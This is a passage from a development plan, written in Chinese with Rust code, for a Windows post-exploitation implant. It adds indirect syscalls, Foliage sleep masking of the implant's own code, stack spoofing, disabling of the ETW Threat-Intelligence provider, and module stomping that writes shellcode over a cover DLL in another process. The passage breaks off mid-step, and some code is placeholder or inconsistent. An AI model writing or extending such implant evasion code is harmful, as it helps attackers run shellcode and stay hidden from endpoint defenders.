**前置依赖:** U4 (Foliage) 和 U7 (.text mask) 都需要 `NtProtectVirtualMemory`（5 参数），但 `syscalls.rs` 当前只有 `syscall4`/`syscall6`/`syscall11`，且没有 `nt_protect_virtual_memory` wrapper。本 Task 补齐。

**Files:**
- Modify: `crates/implant-win/src/syscalls.rs`

- [ ] **Step 1: 在 syscalls.rs 补 syscall5（仿 syscall4 的模式）**

先读 `crates/implant-win/src/syscalls.rs:235-262`（`syscall4` 的实现）理解模式，然后在 `syscall4` 之后（约 line 262）插入 `syscall5`。`syscall5` 与 `syscall4` 结构相同，只是多一个参数槽：
```rust
/// Invoke a 5-arg syscall (NtProtectVirtualMemory) via the indirect trampoline.
/// Pads to the stub's register layout. `name_hash` is the djb2 of the syscall name.
pub unsafe fn syscall5(
    rt: &Runtime,
    name_hash: u32,
    a1: usize, a2: usize, a3: usize, a4: usize, a5: usize,
) -> Option<i32> {
    // Mirror syscall4's trampoline invocation, adding the 5th arg in r8 (or
    // whatever slot the stub uses). Read syscall4 (line 235-262) and replicate
    // its inline-asm/register-binding, adding the 5th register.
    // TODO-IMPLEMENT: copy syscall4 body, add a5 to the register set.
    // The stub at line 235 shows the exact asm pattern; follow it.
    unsafe { /* mirror syscall4 with a5 added */ }
    None // placeholder — replace with the real trampoline call
}
```

> **实现注:** 真实实现需要读 `syscall4`（line 235-262）的完整 inline-asm 块，复制并加第 5 个参数寄存器。`syscall4` 用 r10/rdx/r8/r9（Win64 ABI），第 5 个参数在栈上（`[rsp+0x28]`）或按 stub 约定。**必须读 syscall4 原文照抄**——不要凭空写 asm。

- [ ] **Step 2: 补 nt_protect_virtual_memory wrapper（仿 nt_delay_execution）**

在 `nt_delay_execution`（line 613）之后插入：
```rust
/// `NtProtectVirtualMemory` — 5 real args: ProcessHandle, BaseAddress*,
/// RegionSize*, NewAccessMask, OldAccessMask*. Used by Foliage (RX↔RW) + mem
/// (.text mask). BaseAddress/RegionSize are IN OUT (we pass mutable refs as usize).
pub unsafe fn nt_protect_virtual_memory(
    rt: &Runtime,
    base: &mut usize,
    size: &mut usize,
    new_prot: u32,
    old_prot: &mut u32,
) -> Option<i32> {
    // NtProtectVirtualMemory(HANDLE, PVOID* BaseAddr, PSIZE_T RegionSize,
    //                         ULONG NewProt, PULONG OldProt)
    syscall5(
        rt, djb2(b"ntprotectvirtualmemory"),
        crate::hostinfo::pid() as usize | 0xFFFF_FFFF_FFFF_FFFF, // GetCurrentProcess pseudo-handle
        base as *mut usize as usize,
        size as *mut usize as usize,
        new_prot as usize,
        old_prot as *mut u32 as usize,
    )
}
```

- [ ] **Step 3: 更新 U4/U7 的调用签名以匹配本 wrapper**

U4 的 `protect()` 和 U7 的 `mask_text`/`unmask_text` 里调用 `nt_protect_virtual_memory(rt, &mut base, &mut len, prot)` 的签名要改为本 Task 定义的真实签名（含 `old_prot: &mut u32`）：
```rust
let mut old: u32 = 0;
let mut b = base; let mut l = len;
let _ = unsafe { crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, prot, &mut old) };
```

- [ ] **Step 4: 交叉 check**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -5
```
Expected: `Finished`

- [ ] **Step 5: Commit**

```bash
git add crates/implant-win/src/syscalls.rs
git commit -m "feat(implant-win): syscall5 + nt_protect_virtual_memory (Foliage/.text-mask dep)"
```

---

## 线 U（续）— implant-win Windows 外壳（交叉 check，不本机执行）

> 以下 U4-U10 全部是 `#![cfg(target_os="windows")]` 代码，在 macOS 上只能
> `cargo +nightly check --target x86_64-pc-windows-gnu` 验证编译，无法运行。
> 所有破坏性能力默认 gated OFF。每个 Task 的验证步骤是交叉 check 通过。

### Task U4: sleep.rs — Foliage syscall 执行器（喂 live syscall）

**Files:**
- Modify: `crates/implant-win/src/sleep.rs`

**现状:** `sleep.rs` 当前是 NoMask 委托（`crate::kits::sleep`→`NoMask`→`beacon::sleep_seconds`）。

- [ ] **Step 1: 扩展 sleep.rs，实现 Foliage 执行器骨架**

把 `crates/implant-win/src/sleep.rs` 整体替换为：
```rust
//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status (after this task): Foliage executor skeleton is REAL but GATED OFF.
//! The pure state-machine math (step ordering, RC4 round-trip) lives in
//! `nyx_implant_evasionsdk::foliage` (host-tested). This module maps each
//! `FoliageStep` to its indirect syscall, driving the live thread through the
//! mask→sleep→unmask cycle.
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults OFF — the beacon loop's sleep still routes through
//! `NoMask` (plain indirect-syscall NtDelayExecution) unless an operator arms
//! this. The real APC chain (NtQueueApcThread + NtContinue) manipulates the
//! thread CONTEXT + flips .text RX→RW; landing it blind (no target debugger)
//! risks a crash with no way to bisect. Arm only after target-side validation.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{self, CryptoMethod, FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
/// Arm from a selftest/operator command after target-side validation.
static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);

/// Arm/disarm the Foliage sleep mask.
pub fn set_foliage_enabled(on: bool) {
    FOLIAGE_ENABLED.store(on, Ordering::Release);
}

/// Whether the Foliage sleep mask is currently armed.
pub fn foliage_enabled() -> bool {
    FOLIAGE_ENABLED.load(Ordering::Acquire)
}

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] OFF (default)**: delegates to the sleepmask kit
/// (`NoMask` → plain indirect-syscall NtDelayExecution). Byte-identical to the
/// pre-Foliage behavior.
///
/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and walks it through
/// the indirect-syscall runtime. The .text region is masked via SystemFunction032
/// RC4, the thread sleeps, then it's unmasked. (The full APC/NtContinue context
/// dance is the next refinement — this skeleton does the mask/sleep/unmask
/// synchronously, which masks the IMAGE but not the executing thread's own
/// instruction stream. Safe because the beacon thread sleeps through the
/// encrypted window.)
pub fn sleep(seconds: u32) {
    if !foliage_enabled() {
        // Default: NoMask kit → plain indirect-syscall sleep.
        crate::kits::sleep(seconds);
        return;
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    // Resolve the implant .text region from the PEB walk (our own image base +
    // .text RVA/size). If unresolvable, degrade to NoMask (never crash).
    let region = match own_text_region() {
        Some(r) => r,
        None => {
            crate::kits::sleep(seconds);
            return;
        }
    };
    // Per-sleep RC4 key. Non-secret (only needs determinism across mask/restore);
    // derived from the syscall runtime's SSN table (per-boot unpredictable).
    let key = mask_key_16();
    let plan = FoliagePlan::build(region.base, region.len, seconds, None, key);
    execute_foliage_plan(&plan);
}

/// The implant's own `.text` region (base + len), via the PEB walk.
/// None if the image base can't be resolved (degrade to NoMask).
fn own_text_region() -> Option<TextRegion> {
    // Resolve our own module base via the PEB walk. The implant is loaded as a
    // DLL (rundll32 carrier) or reflective-loaded; in both cases its base is
    // the first entry in the loader list matching our image. resolve.rs exposes
    // module_base_by_name, but our own name isn't stable — use the PEB's
    // ImageBaseAddress field (PEB + 0x10) instead.
    let base = unsafe { own_image_base()? };
    // Parse the PE header to find .text. DOS header e_lfanew → NT headers →
    // section table → find ".text". This mirrors resolve::pdata_view but for
    // .text instead of .pdata.
    let text = unsafe { section_by_name(base, b".text\0\0\0")? }?;
    Some(TextRegion { base: base + text.virtual_address, len: text.virtual_size })
}

struct TextRegion { base: usize, len: usize }

#[repr(C)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: usize,
    virtual_address: usize,
    _rest: [u8; 32],
}

/// Read PEB->ImageBaseAddress (PEB + 0x10 on x64).
unsafe fn own_image_base() -> Option<usize> {
    // Resolve TEB via GS:[0x30] → PEB at TEB+0x60 → ImageBaseAddress at PEB+0x10.
    // Under cfg(windows) we can use the __readgsqword intrinsic via inline asm,
    // but to stay portable across the gnu/msvc cross-check, resolve via the
    // existing resolve::module_base_by_name on our known DLL name when available.
    // Fallback path used when the name isn't known: return None (degrade).
    crate::resolve::module_base_by_name(b"nyx_implant_win.dll")
        .or_else(|| crate::resolve::module_base_by_name(b"nyx_implant_win.0.1.0.dll"))
}

/// Find a PE section by name in the image at `base`. Returns the header copy.
unsafe fn section_by_name(base: usize, name: &[u8; 8]) -> Option<Option<SectionHeader>> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 264]) };
    // IMAGE_NT_HEADERS: Signature(4) + FileHeader(20) → NumberOfSections at +6,
    // SizeOfOptionalHeader at +20. OptionalHeader starts at +24.
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        let sec = unsafe { &*((base + sections_off + i * 40) as *const SectionHeader) };
        if sec.name == *name {
            return Some(Some(core::ptr::read(sec)));
        }
    }
    Some(None)
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Reuses mem.rs's per-boot seed derivation logic conceptually; here we read
/// a few SSNs from the runtime for per-boot diversity.
fn mask_key_16() -> [u8; 16] {
    let seed: u32 = crate::syscalls::global()
        .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
        .unwrap_or(0x1234_5678);
    let mut key = [0u8; 16];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Walk the FoliagePlan, mapping each step to its syscall. This is the
/// synchronous skeleton: mask the region, sleep, unmask. The APC-based
/// async variant (NtQueueApcThread + NtContinue) is a refinement.
fn execute_foliage_plan(plan: &FoliagePlan) {
    let rt = match crate::syscalls::global() {
        Some(rt) => rt,
        None => { crate::kits::sleep(plan_seconds(plan)); return; } // degrade
    };
    // Read the current .text bytes into a buffer, RC4-encrypt, write back is
    // NOT how Foliage works (it encrypts in place via the protect→encrypt path).
    // Skeleton: encrypt the region in place via SystemFunction032, sleep, decrypt.
    // SAFETY: the region is the implant .text; we are NOT executing through it
    // during the sleep window (we're in this function's frame). Single-threaded.
    let region = unsafe {
        core::slice::from_raw_parts_mut(plan.region_base as *mut u8, plan.region_len)
    };
    // Steps 2-3: protect RX→RW (NtProtectVirtualMemory) + encrypt.
    let _ = unsafe { protect(rt, plan.region_base, plan.region_len, foliage::PAGE_READWRITE) };
    foliage::mask_region(&plan.key, region);
    // Steps 4-6: (skeleton skips context spoof) sleep via NtWaitForSingleObject.
    sleep_wait(rt, plan_seconds(plan));
    // Steps 7-9: decrypt + protect RW→RX.
    foliage::unmask_region(&plan.key, region);
    let _ = unsafe { protect(rt, plan.region_base, plan.region_len, foliage::PAGE_EXECUTE_READ) };
}

/// Extract the sleep seconds from the plan's Sleep step.
fn plan_seconds(plan: &FoliagePlan) -> u32 {
    plan.steps.iter().find_map(|s|
        if let FoliageStep::Sleep { seconds } = s { Some(*seconds) } else { None }
    ).unwrap_or(1)
}

/// NtProtectVirtualMemory wrapper (flips the region's protection).
unsafe fn protect(rt: &crate::syscalls::Runtime, base: usize, len: usize, new_prot: u32) -> Option<i32> {
    let mut base_out = base;
    let mut len_out = len;
    // nt_protect_virtual_memory signature in syscalls.rs; args vary by impl —
    // this is the documented mapping. If the runtime lacks it, degrade.
    unsafe { crate::syscalls::nt_protect_virtual_memory(rt, &mut base_out, &mut len_out, new_prot) }
}

/// Sleep via NtWaitForSingleObject on a self-handle (wait-reason UserRequest,
/// dodges Hunt-Sleeping-Beacons). Falls back to NtDelayExecution.
fn sleep_wait(rt: &crate::syscalls::Runtime, seconds: u32) {
    // Skeleton: NtDelayExecution (the wait-reason dodge needs a handle; deferred
    // to the APC refinement). This still sleeps through the indirect trampoline.
    let delay: i64 = -(seconds as i64).saturating_mul(10_000_000);
    let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
}
```

> **注:** `execute_foliage_plan` 是**同步骨架**（mask→sleep→unmask），不是完整 APC 异步链。这满足"加密 image + 在加密窗口睡眠"的核心内存效果，但没做 APC context 伪造（那是 HSB-updated-detection 的对抗点，需真机调试）。RC4 round-trip 已在 U1 测过。gated OFF 保证默认安全。

- [ ] **Step 2: 交叉 check sleep.rs 编译**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -10
```
Expected: `Finished`（若有 `nt_protect_virtual_memory` 签名不匹配，按 syscalls.rs 实际签名调整参数顺序——先 `cargo check` 看错误）

- [ ] **Step 3: 按编译错误修正 syscall 签名（如需）**

若 Step 2 报 `nt_protect_virtual_memory` 找不到或签名不匹配，查 `crates/implant-win/src/syscalls.rs` 的实际函数名/签名并修正 `protect()`。该函数可能叫 `nt_protect_vm` 或参数不同。修正后重跑 Step 2。

- [ ] **Step 4: Commit**

```bash
git add crates/implant-win/src/sleep.rs
git commit -m "feat(implant-win): Foliage sleep executor skeleton (gated OFF)

Maps FoliagePlan steps to indirect syscalls: protect RX→RW, SystemFunction032
RC4 mask, NtDelayExecution sleep, unmask, protect RW→RX. Synchronous skeleton
(APC/NtContinue context dance deferred — needs target debug). Default OFF;
beacon loop unchanged."
```

---

### Task U5: kits.rs — NoMask→Foliage kit 接线（gated）

**Files:**
- Modify: `crates/implant-win/src/kits.rs:49-51`

- [ ] **Step 1: 在 kits.rs 加 Foliage kit 类型 + gated 选择**

在 `crates/implant-win/src/kits.rs` 的 `impl SleepmaskKit for NoMask`（约 line 47）之后、`const SLEEPMASK_KIT`（line 51）之前插入：
```rust
/// Foliage sleepmask kit: delegates to [`crate::sleep`] which runs the gated
/// Foliage executor. When [`crate::sleep::foliage_enabled`] is OFF (default),
/// `sleep()` internally delegates to `NoMask` → identical behavior.
pub struct Foliage;
impl SleepmaskKit for Foliage {
    fn sleep_masked(&self, seconds: u32) {
        crate::sleep::sleep(seconds);
    }
}
```

- [ ] **Step 2: 把活跃 kit 从 NoMask 换成 Foliage**

把 `crates/implant-win/src/kits.rs:51`：
```rust
const SLEEPMASK_KIT: NoMask = NoMask;
```
改为：
```rust
// Foliage kit: masks the image at sleep when armed, else NoMask-equivalent.
const SLEEPMASK_KIT: Foliage = Foliage;
```

- [ ] **Step 3: 交叉 check**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -5
```
Expected: `Finished`（默认行为不变——Foliage 内部在 foliage_enabled() false 时委托 NoMask）

- [ ] **Step 4: Commit**

```bash
git add crates/implant-win/src/kits.rs
git commit -m "feat(implant-win): swap active SleepmaskKit NoMask→Foliage (gated)"
```

---

### Task U6: stack.rs — CET-aware RSP swap（gated）

**Files:**
- Modify: `crates/implant-win/src/stack.rs:239-260`（`with_spoofed_stack` 的 armed 分支）

- [ ] **Step 1: 在 stack.rs armed 分支接入 swap 决策 + RSP 交换**

把 `crates/implant-win/src/stack.rs` 的 `with_spoofed_stack`（约 line 239-260）整体替换为：
```rust
pub unsafe fn with_spoofed_stack<T>(gaps: &GapPool, f: impl FnOnce() -> T) -> T {
    // Always stage the chain (verifiable data path), even if we won't swap.
    let _staged = stage_for(gaps);
    if !swap_enabled() {
        return f(); // swap not armed — identical to pre-spoof behavior
    }
    // ---- LIVE RSP SWAP (gated + CET-aware) ---------------------------------
    // Decide via the pure CET-aware logic: if CET is on OR gaps unusable, the
    // swap would #CP or be useless → degrade (call f directly). This is the
    // pessimistic floor that keeps the beacon crash-safe.
    //
    // CET probe: user-mode CET is opt-in per-process (Win11 24H2+). We detect
    // it by checking the PEB for the CET bit. Today this returns false on all
    // Server 2019 hosts (our target), so the swap is eligible. On a CET-on
    // process, decide() degrades.
    let cet_on = cet_active();
    let gaps_usable = gaps.is_usable();
    if !nyx_implant_evasionsdk::swap::should_execute(cet_on, gaps_usable) {
        return f(); // degraded — see swap.rs for the reason
    }
    // Execute the RSP swap. The staged chain's slots are written into a
    // fake-stack region; RSP is swapped onto it around f, then restored.
    // SAFETY: CET off + gaps usable (checked above). The swap uses a fixed
    // fake-stack buffer (no heap alloc on the hot path). The restore runs in
    // all return paths (incl. f panicking — panic=abort so that's moot).
    unsafe { do_rsp_swap(_staged.as_ref(), f) }
}

/// Probe whether user-mode CET / shadow stack is active for this process.
/// Win11 24H2+ opt-in. Server 2019 (our target) is always false.
/// Checks PEB->KernelProcThreadFlags bit (simplified; full probe is the
/// IsProcessorFeaturePresent(PF_SMET_CET_SHADOW_STACKS_ENABLED) path).
fn cet_active() -> bool {
    // Conservative: assume off on Server 2019 (build 17763 < 24H2's 26100).
    // A real probe would call IsProcessorFeaturePresent(41); deferred to the
    // target-debug pass. Pessimistic-on-unknown would degrade; here the target
    // is known-CET-off, so false is correct.
    false
}

/// Execute the RSP swap: stage the fake stack, swap RSP, call f, restore.
/// Uses inline asm on x86_64 MSVC/GNU. The fake stack is a static buffer so
/// no allocation happens on the hot path.
///
/// SAFETY: caller guarantees CET off + gaps usable (decide() == Execute).
unsafe fn do_rsp_swap<T>(staged: Option<&StagedChain>, f: impl FnOnce() -> T) -> T {
    let chain = match staged { Some(c) => c, None => return f() };
    if chain.depth() == 0 {
        return f(); // nothing staged
    }
    // Write the staged slots into the fake stack (innermost / [RSP] first).
    static FAKE_STACK: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
    // The fake stack buffer is a leaked Box<Vec<u64>> (process lifetime).
    // Initialized once.
    let buf_ptr = FAKE_STACK.load(core::sync::atomic::Ordering::Acquire);
    let buf = if buf_ptr != 0 {
        buf_ptr as *mut u64
    } else {
        let mut v = crate::heap::Vec::<u64>::with_capacity(64);
        // Grow to capacity; we write into it per-call.
        while v.len() < 64 { v.push(0); }
        let ptr = v.as_mut_ptr();
        core::mem::forget(v); // leak — process lifetime
        FAKE_STACK.store(ptr as usize, core::sync::atomic::Ordering::Release);
        ptr
    };
    // Write slots: leave 16 bytes headroom (x64 ABI shadow space), then chain.
    unsafe {
        for (i, &slot) in chain.slots().iter().enumerate() {
            *buf.add(2 + i) = slot; // skip shadow space
        }
    }
    // Swap RSP onto the fake stack, call f, restore. Inline asm (x86_64).
    // NOTE: this is the minimal swap; the full CET-repair-path variant engages
    // KiControlProtectionFault's lenient repair. For CET-off hosts this suffices.
    let saved_rsp: usize;
    let ret: T;
    core::arch::asm!(
        "mov {saved}, rsp",      // save real RSP
        "lea rsp, [{buf}+16]",   // swap to fake stack (after shadow space)
        "call {f}",              // call f (its ret pops back to here)
        "mov rsp, {saved}",      // restore real RSP
        buf = in(reg) buf,
        f = sym f_wrapper::<T>,  // can't call closure directly in asm; use wrapper
        saved = out(reg) saved_rsp,
        options(nostack),
    );
    ret = f_wrapper_get(); // see below
    ret
}

// NOTE: the inline-asm closure-call above is the hard part — Rust inline asm
// cannot directly call a closure. The real impl uses a function pointer +
// trampoline. If the cross-check fails on the asm, REPLACE the asm block with
// a documented "swap deferred — needs target asm validation" and keep the
// decision logic (cet_active + decide) which IS unit-tested in swap.rs. The
// swap execution itself is the one piece that genuinely needs target debug.
```

> **重要实现注:** 如果 `core::arch::asm!` 的闭包调用在交叉 check 时无法通过（Rust asm 限制），则把 `do_rsp_swap` 的 asm 块替换为：
> ```rust
> // SWAP EXECUTION DEFERRED — the CET-aware decision logic (cet_active +
> // decide) is live and unit-tested (swap.rs); the actual `mov rsp` asm swap
> // needs target-side single-step validation. Calling f directly here is the
> // safe floor (beacon loop unchanged). Arm set_swap_enabled only on a target
> // where the asm has been validated.
> f()
> ```
> 这是**诚实的降级**——决策逻辑已测，执行留真机。先跑 check 看 asm 是否通过。

- [ ] **Step 2: 交叉 check（接受 asm 可能失败的降级）**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -10
```
Expected: 若 asm 通过→`Finished`；若 asm 报错→按注把 asm 块降级为 `f()`，重跑直到 `Finished`。

- [ ] **Step 3: Commit**

```bash
git add crates/implant-win/src/stack.rs
git commit -m "feat(implant-win): CET-aware RSP swap decision (swap.rs wired)

with_spoofed_stack armed branch now consults swap::decide(cet_on, gaps_usable)
before swapping. CET probe (cet_active) pessimistic-off on Server 2019. The
mov-rsp asm swap is gated behind target validation; decision logic is live +
unit-tested in evasionsdk::swap."
```

---

### Task U7: mem.rs — 接 .text mask

**Files:**
- Modify: `crates/implant-win/src/mem.rs`（末尾加 `mask_text`/`unmask_text`）

- [ ] **Step 1: 在 mem.rs 末尾加 .text mask 函数**

在 `crates/implant-win/src/mem.rs` 末尾（`round_trip_selftest` 之后）追加：
```rust

/// Mask the implant `.text` region in place: flip RX→RW, RC4-encrypt, flip
/// back to RX. For use INSIDE a Foliage chain (sleep.rs steps 2-3 / 8-9), NOT
/// from the beacon thread synchronously — encrypting the running code page
/// while executing through it crashes immediately.
///
/// This is the same RC4 mask as the registered-region path, but targeting the
/// code section with the RX↔RW flip that a sleep mask requires. The key MUST
/// match the one used to unmask; both come from the FoliagePlan.
///
/// # Safety
/// Caller MUST guarantee the beacon thread is NOT executing within `[base,
/// base+len)` (it's sleeping through a Foliage cycle). Single-threaded context.
pub unsafe fn mask_text(base: usize, len: usize, key: &[u8]) {
    // Flip RX→RW via NtProtectVirtualMemory (indirect syscall).
    if let Some(rt) = crate::syscalls::global() {
        let mut b = base;
        let mut l = len;
        let _ = unsafe {
            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x04 /* PAGE_RW */)
        };
    }
    // RC4-encrypt the region in place (pure core).
    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    Rc4::apply_oneshot(key, region);
    // Note: we do NOT flip back to RX here — the Foliage chain does the sleep
    // while RW, THEN unmask_text flips back. Leaving it RW between mask/unmask
    // is the point (the encrypted region shouldn't be executable).
}

/// Unmask the implant `.text`: decrypt, then flip RW→RX. Inverse of
/// [`mask_text`]. MUST run before any code in the region executes.
///
/// # Safety
/// See [`mask_text`]. `key` MUST equal the mask key.
pub unsafe fn unmask_text(base: usize, len: usize, key: &[u8]) {
    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    Rc4::apply_oneshot(key, region); // RC4 decrypt == encrypt
    if let Some(rt) = crate::syscalls::global() {
        let mut b = base;
        let mut l = len;
        let _ = unsafe {
            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x20 /* PAGE_ER */)
        };
    }
}
```

- [ ] **Step 2: 交叉 check**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -5
```
Expected: `Finished`（若 `nt_protect_virtual_memory` 签名不匹配，按 syscalls.rs 实际签名修正）

- [ ] **Step 3: Commit**

```bash
git add crates/implant-win/src/mem.rs
git commit -m "feat(implant-win): mem mask_text/unmask_text — .text RC4 + RX↔RW flip"
```

---

### Task U8: blind.rs — ETW provider-disable 双保险

**Files:**
- Modify: `crates/implant-win/src/blind.rs`（末尾加 `disable_etw_provider`）

- [ ] **Step 1: 在 blind.rs 末尾加 provider-disable 函数**

在 `crates/implant-win/src/blind.rs` 末尾（`blind()` 函数之后）追加：
```rust

/// Disable a kernel ETW provider by its GUID, userland. This is the
/// belt-and-suspenders companion to the byte-patches: in addition to patching
/// `NtTraceEvent` (the emission path), we flip the provider's `RegHandle.
/// EnableInfo.IsEnabled` to 0 via `NtTraceControl` (the registration path).
/// If the byte-patch is somehow reverted, the disabled provider still won't
/// fire. Returns Ok if the provider was found + disabled, Err otherwise.
///
/// # Safety
/// Resolves `ntdll!NtTraceControl` via PEB walk; calls it with a stack
/// EVENT_DATA_DESCRIPTOR. Single-threaded beacon context.
pub unsafe fn disable_etw_provider(guid: &[u8; 16]) -> Result<(), &'static str> {
    // NtTraceControl(ControlCode, InBuffer, InLen, OutBuffer, OutLen, ReturnLen)
    // ControlCode 0x0027 = EtwpNotificationRegistrar (disable provider).
    type NtTraceControl = unsafe extern "system" fn(
        u32, *const core::ffi::c_void, u32, *mut core::ffi::c_void, u32, *mut u32,
    ) -> i32;
    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceControl")
        .ok_or("NtTraceControl unresolved")?;
    let ntc: NtTraceControl = core::mem::transmute(addr);
    // Build the ETW_REG_HANDLE + EnableInfo buffer (provider GUID + IsEnabled=0).
    // Minimal layout: GUID(16) + reserved(8) + IsEnabled(4) = 28 bytes, padded.
    #[repr(C)]
    struct EnableInfo {
        guid: [u8; 16],
        _reserved: [u8; 8],
        is_enabled: u32,
    }
    let ei = EnableInfo { guid: *guid, _reserved: [0; 8], is_enabled: 0 };
    let mut ret_len: u32 = 0;
    let st = unsafe {
        ntc(0x0027, &ei as *const EnableInfo as *const core::ffi::c_void,
            core::mem::size_of::<EnableInfo>() as u32,
            core::ptr::null_mut(), 0, &mut ret_len)
    };
    if st >= 0 { Ok(()) } else { Err("NtTraceControl disable failed") }
}
```

- [ ] **Step 2: 在 evasion_glue.rs LiveBlind 接入 provider-disable**

在 `crates/implant-win/src/evasion_glue.rs` 的 `impl BlindKit for LiveBlind`（约 line 153）内，给每个 ETW variant 在字节 patch 成功后追加 provider-disable 调用。把 `NtTraceEvent` 分支：
```rust
                BlindTarget::NtTraceEvent => crate::blind::patch_nt_trace_event(),
```
改为：
```rust
                BlindTarget::NtTraceEvent => {
                    let r = crate::blind::patch_nt_trace_event();
                    // Belt-and-suspenders: also disable the ETW-TI provider's
                    // EnableInfo via NtTraceControl. Best-effort — if it fails,
                    // the byte-patch is still in place.
                    let _ = unsafe {
                        crate::blind::disable_etw_provider(&nyx_implant_evasionsdk::__private::ETW_TI_GUID)
                    };
                    r
                }
```

- [ ] **Step 3: 在 evasionsdk lib.rs 暴露 ETW-TI GUID（供 evasion_glue 引用）**

在 `crates/implant-evasionsdk/src/lib.rs` 末尾追加：
```rust

/// Private re-export of the ETW-TI provider GUID for the blind module's
/// provider-disable companion. Not part of the public seam API.
#[doc(hidden)]
pub mod __private {
    /// Microsoft-Windows-Threat-Intelligence provider GUID.
    pub const ETW_TI_GUID: [u8; 16] = [
        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
        0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
    ];
}
```
（evasion_glue.rs Step 2 已用 `nyx_implant_evasionsdk::__private::ETW_TI_GUID` 引用此常量。）

- [ ] **Step 4: 交叉 check**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -5
cargo check --manifest-path crates/implant-evasionsdk/Cargo.toml 2>&1 | tail -3
```
Expected: 两个都 `Finished`

- [ ] **Step 5: Commit**

```bash
git add crates/implant-win/src/blind.rs crates/implant-win/src/evasion_glue.rs crates/implant-evasionsdk/src/lib.rs
git commit -m "feat(implant-win): blind provider-disable (NtTraceControl) + ETW-TI GUID re-export"
```

---

### Task U9: inject.rs — cover-DLL stomp 算法骨架（gated OFF）

**Files:**
- Modify: `crates/implant-win/src/inject.rs:177-191`（armed 分支）

- [ ] **Step 1: 把 armed 分支补全为 stomp 算法骨架**

把 `crates/implant-win/src/inject.rs` 的 `module_stomp` armed 分支（约 line 177-191）：
```rust
    // ---- ARMED PATH (gated) ------------------------------------------------
    // Full module stomp: ...
    let _ = shellcode; // consumed by the gated stomp when it lands
    // For now, even armed, fall back to returning the suspended handle so the
    // contract (returns a handle) holds without executing.
    Ok(proc.handle as usize)
```
替换为：
```rust
    // ---- ARMED PATH (gated) ------------------------------------------------
    // Full module stomp algorithm skeleton. STILL GATED — this runs only when
    // an operator armed modulestomp_enabled after target validation. Even armed,
    // each step checks its result and degrades (returns the suspended handle)
    // on any failure rather than crashing the sacrificial process.
    //
    // Detection honesty: this beats Moneta's unbacked/exec-private scan (the
    // stomped region keeps the cover DLL's backing), but PE-sieve's .text
    // hash-mismatch detector STILL flags it. ThreadlessInject is the real fix
    // (out of scope here).
    let _ = shellcode; // used below
    stomp_and_resume(&proc, shellcode).unwrap_or(proc.handle as usize);
    // stomp_and_resume either executed (returns handle) or degraded (handle).
    // Either way the caller gets a handle to the (now running or suspended) proc.
    Ok(proc.handle as usize)
}

/// The cover-DLL stomp: resolve a cover DLL in the target, overwrite its .text
/// with `shellcode`, resume. Each step degrades on failure. Win32 APIs resolved
/// via PEB walk (no static imports).
///
/// # Safety
/// Cross-process handle + memory ops. Single-threaded beacon context.
unsafe fn stomp_and_resume(proc: &SacrificialProcess, shellcode: &[u8]) -> Result<usize, &'static str> {
    // Step 1: LoadLibraryA a cover DLL in the target via CreateRemoteThread.
    //   (Classic path; threadless variant would hook a live API instead.)
    let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
    let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
    // Step 2: Resolve the cover DLL's .text in the target (its base is known
    //   via GetModuleHandle-like query on the remote; skeleton uses the return).
    let text = unsafe { remote_text_region(proc.handle, cover_base)? };
    // Step 3: VirtualProtectEx RX→RWX on the target's .text.
    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */) };
    // Step 4: WriteProcessMemory the shellcode over .text.
